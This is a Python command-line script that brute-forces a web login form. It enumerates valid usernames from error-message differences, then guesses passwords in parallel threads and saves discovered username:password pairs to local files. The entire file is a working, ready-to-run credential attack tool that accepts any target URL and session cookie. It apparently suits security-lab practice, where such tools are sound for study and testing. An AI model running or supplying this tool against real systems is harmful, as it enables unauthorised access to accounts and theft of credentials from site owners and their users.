#!/usr/bin/env python3

import requests
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import argparse
import os
import sys


def fetch_items(filename):
    try:
        with open(filename, 'r') as fd:
            return [line.strip() for line in fd if line.strip()]
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        exit(1)

def check_server_availability(url, cookie):
    try:
        response = requests.get(url, cookies=cookie, timeout=5)
        if response.status_code == 200:
            print("[+] Server is reachable.")
            return True
        else:
            print(f"[-] Server returned status code: {response.status_code}. Exiting.")
            return False
    except requests.RequestException as e:
        print(f"[-] Server is unreachable: {e}. Exiting.")
        return False


def check_username(queue, url, cookie):
    while not queue.empty():
        username = queue.get()
        try:
            login_data = {'username': username, 'password': 'anything'}
            response = requests.post(url, cookies=cookie, data=login_data, timeout=10)

            if 'Invalid username' not in response.text:
                print(f"[+] Found valid username: {username}")
                with open("valid_usernames.txt", "a") as result_file:
                    result_file.write(f"{username}\n")
        except requests.RequestException as e:
            print(f"Error checking username {username}: {e}")
        finally:
            queue.task_done()


def check_password(queue, url, cookie, valid_username):
    while not queue.empty():
        password = queue.get()
        try:
            login_data = {'username': valid_username, 'password': password}
            response = requests.post(url, cookies=cookie, data=login_data, timeout=10)

            if 'Incorrect password' not in response.text:
                print(f"[+] Found valid credentials: {valid_username}:{password}")
                with open("valid_credentials.txt", "a") as result_file:
                    result_file.write(f"{valid_username}:{password}\n")
        except requests.RequestException as e:
            print(f"Error checking password {password} for {valid_username}: {e}")
        finally:
            queue.task_done()


def main():
    parser = argparse.ArgumentParser(description="Brute-force a login form.")
    parser.add_argument('--url', required=True, help="Target URL")
    parser.add_argument('--cookie', required=True, help="Session cookie")
    parser.add_argument('--userlist', help="File containing usernames")
    parser.add_argument('--passlist', help="File containing passwords")
    parser.add_argument('--mode', choices=['username', 'password', 'both'], default='username', help="Brute-force mode")
    parser.add_argument('--threads', type=int, default=10, help="Number of concurrent threads")
    args = parser.parse_args()



    # Load usernames and/or passwords
    if args.mode in ['username', 'both'] and not args.userlist:
        print("Error: --userlist is required for username brute-forcing.")
        exit(1)
    if args.mode in ['password', 'both'] and not args.passlist:
        print("Error: --passlist is required for password brute-forcing.")
        exit(1)

    usernames = fetch_items(args.userlist) if args.userlist else ['static_user']
    passwords = fetch_items(args.passlist) if args.passlist else ['static_pass']

    print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords.")


    if not check_server_availability(args.url, {'session': args.cookie}):
        sys.exit(1)


    if args.mode == 'username':
        task_queue = Queue()
        for username in usernames:
            task_queue.put(username)

        with ThreadPoolExecutor(args.threads) as executor:
            for _ in range(args.threads):
                executor.submit(check_username, task_queue, args.url, {'session': args.cookie})

        task_queue.join()

    elif args.mode == 'password':
        valid_username = 'static_user'
        task_queue = Queue()
        for password in passwords:
            task_queue.put(password)

        with ThreadPoolExecutor(args.threads) as executor:
            for _ in range(args.threads):
                executor.submit(check_password, task_queue, args.url, {'session': args.cookie}, valid_username)

        task_queue.join()

    elif args.mode == 'both':
        # Check usernames first
        valid_usernames = []
        for username in usernames:
            response = requests.post(
                args.url, cookies={'session': args.cookie}, data={'username': username, 'password': 'anything'}
            )
            if 'Invalid username' not in response.text:
                print(f"[+] Found valid username: {username}")
                valid_usernames.append(username)

        if not valid_usernames:
            print("No valid usernames found. Exiting.")
            exit(1)

        # Check passwords for each valid username
        for valid_username in valid_usernames:
            task_queue = Queue()
            for password in passwords:
                task_queue.put(password)

            with ThreadPoolExecutor(args.threads) as executor:
                for _ in range(args.threads):
                    executor.submit(check_password, task_queue, args.url, {'session': args.cookie}, valid_username)

            task_queue.join()

    print("All tasks completed.")


if __name__ == '__main__':
    main()
